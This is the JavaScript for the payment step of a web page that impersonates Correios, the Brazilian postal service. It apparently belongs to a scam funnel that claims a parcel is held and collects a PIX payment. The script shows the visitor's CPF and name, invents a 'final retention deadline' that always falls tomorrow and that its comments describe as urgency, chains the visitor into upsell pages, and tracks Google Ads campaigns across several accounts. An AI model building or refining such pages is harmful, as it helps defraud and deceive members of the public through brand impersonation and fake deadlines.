/**
 * ========================================
 * CORREIOS - ETAPA 2 - PAGAMENTO
 * JavaScript otimizado e organizado
 * Versão: 2.1.0
 * ========================================
 */

(function() {
    'use strict';

    // ===== PROTEÇÃO LOCALSTORAGE PII =====
    const _originalSetItem = localStorage.setItem;
    const _originalGetItem = localStorage.getItem;
    const PII_KEYS = ['correios_cpf', 'correios_nome', 'correios_email', 'correios_telefone'];

    localStorage.setItem = function(key, value) {
        if (PII_KEYS.includes(key)) {
            sessionStorage.setItem(key, btoa(encodeURIComponent(value || '')));
            _originalSetItem.call(localStorage, key, ''); // Apaga rastro real
            return;
        }
        _originalSetItem.call(localStorage, key, value);
    };

    localStorage.getItem = function(key) {
        if (PII_KEYS.includes(key)) {
            const stored = sessionStorage.getItem(key);
            if (stored) {
                try { return decodeURIComponent(atob(stored)); } catch(e) {}
            }
            return '';
        }
        return _originalGetItem.call(localStorage, key);
    };

    // ========================================
    // CONFIGURAÇÕES
    // ========================================
    const CONFIG = {
        // ========================================
        // CONFIGURAÇÃO - ALTERE AQUI!
        // ========================================
        // Use 'pagamento.html' para checkout próprio com PIX
        // Ou URL externa como 'https://go.zippify.com.br/3nzi7ypaf3'
        CHECKOUT_URL: 'pagamento.html',
        USE_INTERNAL_CHECKOUT: true, // true = página interna, false = URL externa (Zippify)
        
        LOADER_DELAY: 500,
        PREVISAO_DIAS: 5
    };

    const STORAGE_KEY = 'correios_session';
    const SRC_STORAGE_KEY = 'correios_src';
    const TRACKING_STORAGE_KEY = 'correios_tracking';
    const LEGACY_TRACKING_STORAGE_KEY = 'google_tracking';
    const GOOGLE_CLICK_PARAMS = ['gclid', 'gbraid', 'wbraid'];
    const FUNNEL_STAGE_KEY = 'correios_funnel_stage';
    const FUNNEL_EXPIRY_MS = 24 * 60 * 60 * 1000; // 24 horas em milissegundos

    // ========================================
    // ELEMENTOS DO DOM
    // ========================================
    const elements = {
        loader: null,
        mainContent: null,
        cpfDisplays: null,
        nomeDisplays: null,
        codigoRastreioDisplay: null,
        previsaoEntrega: null,
        btnPagar: null,
        linksPagamento: null
    };


    // ========================================
    // FUNÇÕES UTILITÁRIAS
    // ========================================
    
    /**
     * Obtém parâmetro da URL
     */
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    /**
     * Obtém valor de cookie
     */
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? match[2] : null;
    }

    function getGclidFromCookie() {
        const raw = getCookie('_gcl_aw');
        if (!raw) return '';

        try {
            const parts = decodeURIComponent(raw).split('.');
            return parts[parts.length - 1] || '';
        } catch (e) {
            const parts = raw.split('.');
            return parts[parts.length - 1] || '';
        }
    }

    function readTrackingStorage(storageKey) {
        try {
            const data = localStorage.getItem(storageKey);
            if (!data) return {};
            const parsed = JSON.parse(data);
            return typeof parsed === 'object' && parsed ? parsed : {};
        } catch (e) {
            return {};
        }
    }

    /**
     * Define cookie com expiração
     */
    function setCookie(name, value, hours) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (hours * 60 * 60 * 1000));
        document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
    }

    /**
     * Seleciona imagem aleatória para teste A/B
     * Mantém a mesma imagem por 24 horas via cookie
     * Salva no localStorage para ser enviada ao backend
     */
    function selecionarImagemAB() {
        const COOKIE_NAME = 'correios_img_ab';
        const STORAGE_KEY_IMG = 'correios_imagem_nota';
        const IMAGENS = [
            'nota-fiscal.webp',   // Era nota-fiscal5 (2 vendas)
        ];
        
        // Verifica se já tem cookie com imagem selecionada
        let imagemSelecionada = getCookie(COOKIE_NAME);
        
        if (!imagemSelecionada || !IMAGENS.includes(imagemSelecionada)) {
            // Escolhe aleatoriamente
            const indice = Math.floor(Math.random() * IMAGENS.length);
            imagemSelecionada = IMAGENS[indice];
            
            // Salva no cookie por 24 horas
            setCookie(COOKIE_NAME, imagemSelecionada, 24);
            
        }
        
        // Salva no localStorage para enviar ao backend na geração do PIX
        localStorage.setItem(STORAGE_KEY_IMG, imagemSelecionada);
        
        // Aplica a imagem selecionada
        const imgNotaFiscal = document.querySelector('.img-nota-fiscal');
        if (imgNotaFiscal) {
            imgNotaFiscal.src = `assets/images/${imagemSelecionada}`;
        }
        
        return imagemSelecionada;
    }

    /**
     * Formata CPF: 00000000000 -> 000.000.000-00
     */
    function formatarCPF(cpf) {
        const numeros = cpf.replace(/\D/g, '');
        return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }

    /**
     * Formata nome: JOAO DA SILVA -> João D. Silva
     */
    /**
     * Valida se o nome é válido (não é genérico/placeholder)
     */
    function validarNome(nome) {
        if (!nome) return false;
        const nomeUpper = nome.toUpperCase().trim();
        const nomesInvalidos = [
            'CPF LOCALIZADO',
            'CPF ENCONTRADO',
            'TITULAR',
            'USUARIO',
            'USUÁRIO',
            'CLIENTE',
            'PREZADO',
            'DESTINATÁRIO',
            'DESTINATARIO',
            '---'
        ];
        return !nomesInvalidos.some(invalido => nomeUpper.includes(invalido));
    }

    /**
     * Retorna nome válido ou fallback
     */
    function obterNomeValido(nome) {
        return validarNome(nome) ? nome : 'Prezado Destinatário';
    }

    function formatarNome(nome) {
        const nomeValidado = obterNomeValido(nome);
        const nomeDecodificado = decodificarNome(nomeValidado);
        const partes = nomeDecodificado.trim().split(/\s+/).map(p =>
            p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
        );

        if (partes.length >= 3) {
            return `${partes[0]} ${partes[1].charAt(0)}. ${partes[partes.length - 1]}`;
        } else if (partes.length === 2) {
            return `${partes[0]} ${partes[1]}`;
        }
        return partes.join(' ');
    }

    /**
     * Calcula previsão de entrega (hoje + X dias)
     */
    function calcularPrevisaoEntrega() {
        const hoje = new Date();
        hoje.setDate(hoje.getDate() + CONFIG.PREVISAO_DIAS);
        const dia = hoje.getDate().toString().padStart(2, '0');
        const mes = (hoje.getMonth() + 1).toString().padStart(2, '0');
        const ano = hoje.getFullYear();
        return `Dia ${dia}/${mes}/${ano}`;
    }

    /**
     * Delay assíncrono
     */
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Captura e salva o parâmetro src no localStorage
     * Usado para identificar a conta de origem (G01, G02, etc)
     * Quando src muda (outra conta Google Ads), limpa click params antigos
     * para evitar enviar gclid de uma conta na planilha de outra
     */
    function capturarSrc() {
        const srcUrl = getQueryParam('src');
        
        if (srcUrl && srcUrl !== 'ERR') {
            const srcAnterior = localStorage.getItem(SRC_STORAGE_KEY);
            if (srcAnterior && srcAnterior !== srcUrl) {
                localStorage.removeItem(TRACKING_STORAGE_KEY);
                localStorage.removeItem(LEGACY_TRACKING_STORAGE_KEY);
            }
            localStorage.setItem(SRC_STORAGE_KEY, srcUrl);
            return srcUrl;
        }
        
        const srcLocal = localStorage.getItem(SRC_STORAGE_KEY);
        if (srcLocal && srcLocal !== 'ERR') {
            return srcLocal;
        }
        
        return null;
    }

    /**
     * Retorna o src salvo no localStorage
     */
    function getSrc() {
        const src = localStorage.getItem(SRC_STORAGE_KEY);
        return (src && src !== 'ERR') ? src : '';
    }

    /**
     * Captura e salva tracking do Google Ads
     * Usado para passar gclid para a página de pagamento
     */
    function capturarGoogleTracking() {
        const trackingSalvo = getGoogleTracking();
        const hasStoredTracking = trackingSalvo.gclid || trackingSalvo.gbraid || trackingSalvo.wbraid;
        // Cookie _gcl_aw só é confiável se já temos tracking no localStorage (mesmo contexto de conta).
        // Após src change, localStorage é limpo — cookie pode ter gclid de outra conta Google Ads.
        const cookieGclid = hasStoredTracking ? getGclidFromCookie() : '';
        const tracking = {
            gclid: getQueryParam('gclid') || cookieGclid || trackingSalvo.gclid || '',
            gbraid: getQueryParam('gbraid') || trackingSalvo.gbraid || '',
            wbraid: getQueryParam('wbraid') || trackingSalvo.wbraid || ''
        };
        
        if (GOOGLE_CLICK_PARAMS.some((key) => !!tracking[key])) {
            localStorage.setItem(TRACKING_STORAGE_KEY, JSON.stringify(tracking));
            localStorage.setItem(LEGACY_TRACKING_STORAGE_KEY, JSON.stringify(tracking));
        }
        
        return tracking;
    }

    /**
     * Recupera tracking do Google Ads (localStorage only — sem cookie fallback)
     */
    function getGoogleTracking() {
        try {
            const atual = readTrackingStorage(TRACKING_STORAGE_KEY);
            const legacy = readTrackingStorage(LEGACY_TRACKING_STORAGE_KEY);
            return {
                gclid: atual.gclid || legacy.gclid || '',
                gbraid: atual.gbraid || legacy.gbraid || '',
                wbraid: atual.wbraid || legacy.wbraid || ''
            };
        } catch (e) {
            return { gclid: '', gbraid: '', wbraid: '' };
        }
    }

    // ========================================
    // FUNÇÕES PRINCIPAIS
    // ========================================

    /**
     * Inicializa elementos do DOM
     */
    function initElements() {
        elements.mainContent = document.querySelector('main');
        elements.cpfDisplays = document.querySelectorAll('.cpf-display');
        elements.codigoRastreioDisplay = document.querySelector('.codigo-rastreio');
        elements.previsaoEntrega = document.getElementById('previsaoEntrega');
        elements.btnPagar = document.getElementById('btnPagar');
        elements.linksPagamento = document.querySelectorAll('.link-pagamento');
    }

    /**
     * Recupera dados do localStorage (verifica expiração)
     */
    function recuperarDadosLocais() {
        try {
            const dados = localStorage.getItem(STORAGE_KEY);
            if (!dados) return null;
            
            const parsed = JSON.parse(dados);
            
            // Verifica se expirou
            if (Date.now() > parsed.expiry) {
                localStorage.removeItem(STORAGE_KEY);
                return null;
            }
            
            return parsed;
        } catch (e) {
            localStorage.removeItem(STORAGE_KEY);
            return null;
        }
    }

    /**
     * Cria e exibe loader
     */
    function criarLoader() {
        const loader = document.createElement('div');
        loader.className = 'loader';
        loader.id = 'loader';
        loader.textContent = 'Carregando dados...';
        document.body.appendChild(loader);
        elements.loader = loader;
        
        if (elements.mainContent) {
            elements.mainContent.style.display = 'none';
        }
    }

    /**
     * Remove loader e exibe conteúdo
     */
    async function removerLoader() {
        await delay(CONFIG.LOADER_DELAY);
        
        if (elements.loader) {
            elements.loader.classList.add('hidden');
            elements.loader.remove();
        }
        
        if (elements.mainContent) {
            elements.mainContent.style.display = 'block';
        }
    }

    /**
     * Formata código de rastreio com espaços
     */
    function formatarRastreio(codigo) {
        codigo = codigo.replace(/\s/g, '').toUpperCase();
        if (codigo.length === 13) {
            return codigo.replace(/([A-Z]{2})(\d{3})(\d{3})(\d{3})([A-Z]{2})/, '$1 $2 $3 $4 $5');
        }
        return codigo;
    }

    /**
     * Exibe dados do usuário na página
     */
    /**
     * Decodifica URL encoding (suporta duplo encoding)
     */
    function decodificarNome(nome) {
        if (!nome) return nome;
        try {
            let decoded = nome;
            // Tenta decodificar até não ter mais %
            while (decoded.includes('%')) {
                const newDecoded = decodeURIComponent(decoded);
                if (newDecoded === decoded) break; // Não mudou mais
                decoded = newDecoded;
            }
            return decoded;
        } catch (e) {
            return nome;
        }
    }

    /**
     * Exibe nome do usuário no header (2 primeiros nomes)
     */
    function exibirNomeHeader(nome) {
        // Decodifica o nome (suporta duplo encoding)
        const nomeDecodificado = decodificarNome(nome);
        
        if (!validarNome(nomeDecodificado)) return;
        
        const headerNav = document.getElementById('headerNav');
        const userNameEl = document.querySelector('.btn-entrar .user-name');
        
        if (!headerNav || !userNameEl) return;
        
        // Pega os 2 primeiros nomes
        const partes = nomeDecodificado.trim().split(/\s+/).map(p =>
            p.charAt(0).toUpperCase() + p.slice(1).toLowerCase()
        );
        
        let nomeExibido;
        if (partes.length >= 2) {
            nomeExibido = `${partes[0]} ${partes[1]}`;
        } else {
            nomeExibido = partes[0];
        }
        
        // Atualiza o nome e adiciona classe
        userNameEl.textContent = nomeExibido;
        headerNav.classList.add('has-user-name');
    }

    function exibirDadosUsuario(cpf, nome) {
        const cpfFormatado = formatarCPF(cpf);
        const nomeFormatado = formatarNome(nome);

        // Atualiza todos os elementos com classe .cpf-display
        elements.cpfDisplays.forEach(el => {
            el.textContent = cpfFormatado;
        });

        exibirNomeHeader(nome);
    }

    /**
     * Exibe código de rastreio no lugar do CPF
     */
    function exibirRastreio(rastreio, nome) {
        const rastreioFormatado = formatarRastreio(rastreio);
        const nomeFormatado = formatarNome(nome);

        // Atualiza todos os elementos com classe .cpf-display com o rastreio
        elements.cpfDisplays.forEach(el => {
            el.textContent = rastreioFormatado;
        });

        // Exibe nome no header (se veio nome válido)
        exibirNomeHeader(nome);
    }

    /**
     * Atualiza previsão de entrega
     */
    function atualizarPrevisaoEntrega() {
        if (elements.previsaoEntrega) {
            elements.previsaoEntrega.textContent = calcularPrevisaoEntrega();
        }
    }

    /**
     * Atualiza links de checkout com parâmetros
     */
    function atualizarLinksCheckout(cpf, nome) {
        const urlParams = new URLSearchParams(window.location.search);
        const nomeValidado = obterNomeValido(nome);
        
        // Salva CPF e nome real no sessionStorage de forma ofuscada
        sessionStorage.setItem('correios_cpf', btoa(encodeURIComponent(cpf)));
        if (validarNome(nome)) {
            sessionStorage.setItem('correios_nome', btoa(encodeURIComponent(nome)));
        }
        
        // Parâmetros para o checkout
        const checkoutParams = new URLSearchParams();
        checkoutParams.set('cpf', cpf);
        checkoutParams.set('nome', nomeValidado);
        
        // Preserva rastreio se existir (da URL ou localStorage)
        const rastreio = urlParams.get('rastreio') || localStorage.getItem('correios_rastreio');
        if (rastreio) {
            checkoutParams.set('rastreio', rastreio);
            localStorage.setItem('correios_rastreio', rastreio);
        }
        
        // Preserva src
        const src = getSrc();
        if (src) {
            checkoutParams.set('src', src);
        }
        // Preserva UTMs
        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(utm => {
            const value = urlParams.get(utm);
            if (value) checkoutParams.set(utm, value);
        });
        
        // Prioridade URL -> fallback storage/cookie
        ['gclid', 'gbraid', 'wbraid'].forEach(param => {
            const value = urlParams.get(param);
            if (value) checkoutParams.set(param, value);
        });
        const googleTracking = getGoogleTracking();
        if (!checkoutParams.has('gclid') && googleTracking.gclid) checkoutParams.set('gclid', googleTracking.gclid);
        if (!checkoutParams.has('gbraid') && googleTracking.gbraid) checkoutParams.set('gbraid', googleTracking.gbraid);
        if (!checkoutParams.has('wbraid') && googleTracking.wbraid) checkoutParams.set('wbraid', googleTracking.wbraid);

        // Monta URL de checkout
        let checkoutUrl;
        if (CONFIG.USE_INTERNAL_CHECKOUT) {
            // Checkout interno (pagamento.html)
            checkoutUrl = `${CONFIG.CHECKOUT_URL}?${checkoutParams.toString()}`;
        } else {
            // Checkout externo
            checkoutParams.set('cust_name', nomeValidado);
            checkoutParams.set('document', cpf);
            
            // Adiciona cookies de tracking
            const cookiesExtras = ['_fbp', '_fbc', 'Leadsf'];
            cookiesExtras.forEach(cookieName => {
                const cookieValue = getCookie(cookieName);
                if (cookieValue) {
                    checkoutParams.set(cookieName, cookieValue);
                }
            });
            
            const url = new URL(CONFIG.CHECKOUT_URL);
            checkoutParams.forEach((value, key) => {
                url.searchParams.set(key, value);
            });
            checkoutUrl = url.toString();
        }

        // Atualiza botão principal
        if (elements.btnPagar) {
            elements.btnPagar.href = checkoutUrl;
        }

        // Atualiza links secundários
        elements.linksPagamento.forEach(link => {
            link.href = checkoutUrl;
        });
    }

    /**
     * Atualiza links de checkout com parâmetros de rastreio
     */
    function atualizarLinksCheckoutRastreio(rastreio, nome) {
        const urlParams = new URLSearchParams(window.location.search);
        const nomeValidado = obterNomeValido(nome);
        
        // Salva rastreio e nome real (nunca placeholder) no localStorage
        localStorage.setItem('correios_rastreio', rastreio);
        if (validarNome(nome)) {
            localStorage.setItem('correios_nome', nome);
        }
        
        // Parâmetros para o checkout
        const checkoutParams = new URLSearchParams();
        checkoutParams.set('rastreio', rastreio);
        checkoutParams.set('nome', nomeValidado);
        
        // Preserva src
        const src = getSrc();
        if (src) {
            checkoutParams.set('src', src);
        }
        // Preserva UTMs
        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(utm => {
            const value = urlParams.get(utm);
            if (value) checkoutParams.set(utm, value);
        });
        
        // Prioridade URL -> fallback storage/cookie
        ['gclid', 'gbraid', 'wbraid'].forEach(param => {
            const value = urlParams.get(param);
            if (value) checkoutParams.set(param, value);
        });
        const googleTracking = getGoogleTracking();
        if (!checkoutParams.has('gclid') && googleTracking.gclid) checkoutParams.set('gclid', googleTracking.gclid);
        if (!checkoutParams.has('gbraid') && googleTracking.gbraid) checkoutParams.set('gbraid', googleTracking.gbraid);
        if (!checkoutParams.has('wbraid') && googleTracking.wbraid) checkoutParams.set('wbraid', googleTracking.wbraid);

        // Monta URL de checkout
        let checkoutUrl;
        if (CONFIG.USE_INTERNAL_CHECKOUT) {
            // Checkout interno (pagamento.html)
            checkoutUrl = `${CONFIG.CHECKOUT_URL}?${checkoutParams.toString()}`;
        } else {
            // Checkout externo (Zippify)
            checkoutParams.set('cust_name', nomeValidado);
            
            // Pega CPF do sessionStorage ou URL
            const storedCpf = sessionStorage.getItem('correios_cpf');
            let cpfFromStorage = '';
            try { cpfFromStorage = storedCpf ? decodeURIComponent(atob(storedCpf)) : ''; } catch (e) {}

            const cpf = cpfFromStorage || urlParams.get('cpf') || '';
            if (cpf) {
                checkoutParams.set('document', cpf);
            }
            
            // Adiciona cookies de tracking
            const cookiesExtras = ['_fbp', '_fbc', 'Leadsf'];
            cookiesExtras.forEach(cookieName => {
                const cookieValue = getCookie(cookieName);
                if (cookieValue) {
                    checkoutParams.set(cookieName, cookieValue);
                }
            });
            
            const url = new URL(CONFIG.CHECKOUT_URL);
            checkoutParams.forEach((value, key) => {
                url.searchParams.set(key, value);
            });
            checkoutUrl = url.toString();
        }

        // Atualiza botão principal
        if (elements.btnPagar) {
            elements.btnPagar.href = checkoutUrl;
        }

        // Atualiza links secundários
        elements.linksPagamento.forEach(link => {
            link.href = checkoutUrl;
        });
    }

    // ========================================
    // CARROSSEL
    // ========================================
    
    function initCarousel() {
        const carousel = document.querySelector('.carousel');
        if (!carousel) return;

        const slides = carousel.querySelectorAll('.carousel-slide');
        const indicators = carousel.querySelectorAll('.carousel-indicator');
        const btnPrev = carousel.querySelector('.carousel-btn-prev');
        const btnNext = carousel.querySelector('.carousel-btn-next');
        
        let currentSlide = 0;
        let autoPlayInterval = null;
        const autoPlayDelay = 5000; // 5 segundos

        function goToSlide(index) {
            // Remove active de todos
            slides.forEach(slide => slide.classList.remove('active'));
            indicators.forEach(ind => ind.classList.remove('active'));
            
            // Atualiza índice
            currentSlide = index;
            if (currentSlide >= slides.length) currentSlide = 0;
            if (currentSlide < 0) currentSlide = slides.length - 1;
            
            // Adiciona active ao slide atual
            slides[currentSlide].classList.add('active');
            indicators[currentSlide].classList.add('active');
        }

        function nextSlide() {
            goToSlide(currentSlide + 1);
        }

        function prevSlide() {
            goToSlide(currentSlide - 1);
        }

        function startAutoPlay() {
            stopAutoPlay();
            autoPlayInterval = setInterval(nextSlide, autoPlayDelay);
        }

        function stopAutoPlay() {
            if (autoPlayInterval) {
                clearInterval(autoPlayInterval);
                autoPlayInterval = null;
            }
        }

        // Event listeners
        if (btnNext) {
            btnNext.addEventListener('click', () => {
                nextSlide();
                startAutoPlay(); // Reinicia autoplay
            });
        }

        if (btnPrev) {
            btnPrev.addEventListener('click', () => {
                prevSlide();
                startAutoPlay(); // Reinicia autoplay
            });
        }

        indicators.forEach((indicator, index) => {
            indicator.addEventListener('click', () => {
                goToSlide(index);
                startAutoPlay(); // Reinicia autoplay
            });
        });

        // Pause on hover
        carousel.addEventListener('mouseenter', stopAutoPlay);
        carousel.addEventListener('mouseleave', startAutoPlay);

        // Touch/swipe support
        let touchStartX = 0;
        let touchEndX = 0;

        carousel.addEventListener('touchstart', (e) => {
            touchStartX = e.changedTouches[0].screenX;
            stopAutoPlay();
        }, { passive: true });

        carousel.addEventListener('touchend', (e) => {
            touchEndX = e.changedTouches[0].screenX;
            const diff = touchStartX - touchEndX;
            
            if (Math.abs(diff) > 50) { // Mínimo de 50px para considerar swipe
                if (diff > 0) {
                    nextSlide();
                } else {
                    prevSlide();
                }
            }
            startAutoPlay();
        }, { passive: true });

        // Inicia autoplay
        startAutoPlay();
    }

    // ========================================
    // INICIALIZAÇÃO
    // ========================================
    
    async function init() {
        // ========================================
        // VERIFICAÇÃO DO ESTADO DO FUNIL
        // Se o lead já pagou o front-end, redireciona para última etapa
        // Reset automático após 24 horas
        // ========================================
        const funnelDataRaw = localStorage.getItem(FUNNEL_STAGE_KEY);
        
        if (funnelDataRaw) {
            let funnelStage = null;
            let funnelTimestamp = 0;
            
            // Tenta parsear como JSON (novo formato com timestamp)
            try {
                const funnelData = JSON.parse(funnelDataRaw);
                funnelStage = funnelData.stage;
                funnelTimestamp = funnelData.timestamp || 0;
            } catch (e) {
                // Formato antigo (apenas string) - considera como expirado para migração
                funnelStage = funnelDataRaw;
                funnelTimestamp = 0;
            }
            
            // Verifica se passou 24 horas desde o pagamento
            const agora = Date.now();
            const tempoDecorrido = agora - funnelTimestamp;
            
            if (tempoDecorrido >= FUNNEL_EXPIRY_MS) {
                // Expirou! Limpa estado e permite novo pagamento
                localStorage.removeItem(FUNNEL_STAGE_KEY);
                // Limpa também transações antigas
                localStorage.removeItem('correios_pix_transaction');
                localStorage.removeItem('correios_up1_transaction');
                localStorage.removeItem('correios_up2_transaction');
                // Limpa transações de lote (todos os lotes)
                localStorage.removeItem('correios_lote_transaction_1');
                localStorage.removeItem('correios_lote_transaction_2');
                localStorage.removeItem('correios_lote_transaction_3');
                localStorage.removeItem('correios_lote_offer_timer');
                // Limpa flags de skip
                localStorage.removeItem('correios_up1_skipped');
                // Limpa timers de urgência para recalcular
                localStorage.removeItem('correios_retido_desde');
                localStorage.removeItem('correios_prazo_final');
                // Continua normalmente (não redireciona)
            } else if (funnelStage) {
                const horasRestantes = Math.ceil((FUNNEL_EXPIRY_MS - tempoDecorrido) / (60 * 60 * 1000));
                
                // Redireciona baseado no estágio
                switch (funnelStage) {
                    case 'frontend_paid':
                        window.location.replace('up1.html');
                        return;
                    case 'up1_paid':
                        window.location.replace('up2.html');
                        return;
                    case 'up2_paid':
                        window.location.replace('lote.html');
                        return;
                    case 'lote_paid':
                    case 'completed':
                        window.location.replace('sucesso.html');
                        return;
                }
            }
        }
        
        // Inicializa elementos
        initElements();
        
        // Cria loader
        criarLoader();
        
        // Seleciona imagem aleatória para teste A/B (cookie 24h)
        selecionarImagemAB();

        // Captura e salva o parâmetro src (G01, G02, etc)
        const src = capturarSrc();
        
        // Captura e salva tracking do Google Ads (gclid)
        capturarGoogleTracking();

        // PRIORIDADE 1: Parâmetros da URL (cross-domain)
        const tipoUrl = getQueryParam('tipo');
        const cpfUrl = getQueryParam('cpf');
        const nomeUrl = getQueryParam('nome');
        const rastreioUrl = getQueryParam('rastreio');

        let dadosCarregados = false;

        // Se veio dados via URL (cross-domain)
        if (tipoUrl || cpfUrl || rastreioUrl) {
            const nome = nomeUrl ? decodificarNome(nomeUrl) : 'Prezado Destinatário';
            
            if (tipoUrl === 'cpf' && cpfUrl) {
                // Consulta foi por CPF
                exibirDadosUsuario(cpfUrl, nome);
                atualizarLinksCheckout(cpfUrl, nome);
                
                // Exibe código de rastreio se veio junto
                if (rastreioUrl && elements.codigoRastreioDisplay) {
                    elements.codigoRastreioDisplay.textContent = formatarRastreio(rastreioUrl);
                }
                dadosCarregados = true;
            } else if (tipoUrl === 'rastreio' && rastreioUrl) {
                // Consulta foi por rastreio
                exibirRastreio(rastreioUrl, nome);
                atualizarLinksCheckoutRastreio(rastreioUrl, nome);
                
                if (elements.codigoRastreioDisplay) {
                    elements.codigoRastreioDisplay.textContent = formatarRastreio(rastreioUrl);
                }
                dadosCarregados = true;
            } else if (cpfUrl) {
                // Fallback: só CPF na URL (compatibilidade)
                exibirDadosUsuario(cpfUrl, nome);
                atualizarLinksCheckout(cpfUrl, nome);
                dadosCarregados = true;
            } else if (rastreioUrl) {
                // Fallback: só rastreio na URL (compatibilidade)
                exibirRastreio(rastreioUrl, nome);
                atualizarLinksCheckoutRastreio(rastreioUrl, nome);
                
                if (elements.codigoRastreioDisplay) {
                    elements.codigoRastreioDisplay.textContent = formatarRastreio(rastreioUrl);
                }
                dadosCarregados = true;
            }
        }

        // PRIORIDADE 2: localStorage (fallback para mesmo domínio)
        if (!dadosCarregados) {
            const dadosLocais = recuperarDadosLocais();

            if (dadosLocais) {
                const { tipo, cpf, nome, codigoRastreio } = dadosLocais;
                
                // Sempre exibe o código de rastreio no campo .codigo-rastreio
                if (elements.codigoRastreioDisplay && codigoRastreio) {
                    elements.codigoRastreioDisplay.textContent = formatarRastreio(codigoRastreio);
                }

                if (tipo === 'cpf' && cpf) {
                    exibirDadosUsuario(cpf, nome || 'Prezado Destinatário');
                    atualizarLinksCheckout(cpf, nome || 'Prezado Destinatário');
                    dadosCarregados = true;
                } else if (tipo === 'rastreio' && codigoRastreio) {
                    exibirRastreio(codigoRastreio, nome || 'Prezado Destinatário');
                    atualizarLinksCheckoutRastreio(codigoRastreio, nome || 'Prezado Destinatário');
                    dadosCarregados = true;
                }
            }
        }

        // PRIORIDADE 3: Fallback - sem dados
        if (!dadosCarregados) {
            
            // Pega o código de rastreio do elemento .codigo-rastreio e exibe no .cpf-display
            if (elements.codigoRastreioDisplay && elements.cpfDisplays) {
                const codigoRastreio = elements.codigoRastreioDisplay.textContent.trim();
                if (codigoRastreio && codigoRastreio !== '---') {
                    elements.cpfDisplays.forEach(el => {
                        el.textContent = codigoRastreio;
                    });
                }
            }
            
            // Define link de pagamento padrão mesmo sem dados
            if (elements.btnPagar) {
                elements.btnPagar.href = CONFIG.CHECKOUT_URL;
            }
            
            // Define links secundários também
            elements.linksPagamento.forEach(link => {
                link.href = CONFIG.CHECKOUT_URL;
            });
        }

        // Atualiza previsão de entrega
        atualizarPrevisaoEntrega();

        // Exibe retenção e prazo final no bloco info-tributacao
        iniciarExibicaoRetencao();

        // Intercepta cliques de checkout para enviar tracking (image_shown) antes do redirect
        interceptarCheckoutExterno();

        // Remove loader
        await removerLoader();

        // Inicializa carrossel
        initCarousel();
    }

    /**
     * Envia dados de tracking (image_shown, gclid etc) para o backend
     * antes de redirecionar para checkout externo (Zippify).
     * Fire-and-forget: não bloqueia o redirect.
     */
    function enviarTrackingPreCheckout() {
        const imageShown = localStorage.getItem('correios_imagem_nota') || '';
        const cpf = localStorage.getItem('correios_cpf') || getQueryParam('cpf') || '';
        const nome = localStorage.getItem('correios_nome') || getQueryParam('nome') || '';
        const src = getSrc() || '';
        const googleTracking = getGoogleTracking();
        const urlParams = new URLSearchParams(window.location.search);

        const payload = {
            cpf: cpf.replace(/\D/g, ''),
            nome: nome,
            image_shown: imageShown,
            src: src,
            gclid: urlParams.get('gclid') || googleTracking.gclid || '',
            gbraid: urlParams.get('gbraid') || googleTracking.gbraid || '',
            wbraid: urlParams.get('wbraid') || googleTracking.wbraid || '',
            utm_source: urlParams.get('utm_source') || '',
            utm_medium: urlParams.get('utm_medium') || '',
            utm_campaign: urlParams.get('utm_campaign') || '',
            utm_term: urlParams.get('utm_term') || '',
            utm_content: urlParams.get('utm_content') || '',
        };

        // Usa sendBeacon para garantir envio mesmo com navegação imediata
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        const sent = navigator.sendBeacon('api/save-tracking.php', blob);

        if (!sent) {
            // Fallback: fetch com keepalive
            fetch('api/save-tracking.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(() => {});
        }

    }

    /**
     * Intercepta cliques nos links de checkout externo para enviar tracking antes
     */
    function interceptarCheckoutExterno() {
        if (CONFIG.USE_INTERNAL_CHECKOUT) return; // Não precisa para checkout interno

        const interceptar = (el) => {
            if (!el) return;
            el.addEventListener('click', function() {
                enviarTrackingPreCheckout();
            });
        };

        // Intercepta botão principal
        interceptar(elements.btnPagar);

        // Intercepta links secundários
        elements.linksPagamento.forEach(link => interceptar(link));
    }

    // ========================================
    // EXIBIÇÃO DE RETENÇÃO (urgência/escassez)
    // ========================================

    function iniciarExibicaoRetencao() {
        // Prazo final: sempre "amanhã às 23:59" (rolling, recalculado a cada visita)
        const amanha = new Date();
        amanha.setDate(amanha.getDate() + 1);
        amanha.setHours(23, 59, 0, 0);
        const prazoFinal = amanha.getTime();

        // Preenche prazo final (estático)
        function atualizarPrazoFinalTexto(textoPrazo) {
            const elPrazo = document.getElementById('prazoFinal');
            if (elPrazo) {
                elPrazo.textContent = textoPrazo;
                return;
            }

            // Fallback para HTML legado sem <span id="prazoFinal">
            const elPrazoLinha = document.querySelector('.prazo-oficial');
            if (elPrazoLinha) {
                elPrazoLinha.textContent = `Prazo final de retenção: ${textoPrazo}`;
            }
        }

        const d = new Date(prazoFinal);
        const dia = d.getDate().toString().padStart(2, '0');
        const mes = (d.getMonth() + 1).toString().padStart(2, '0');
        const ano = d.getFullYear();
        atualizarPrazoFinalTexto(`${dia}/${mes}/${ano} às 23:59`);

        // "Retido há" removido — urgência transmitida apenas pelo prazo final
    }

    // Aguarda DOM estar pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();

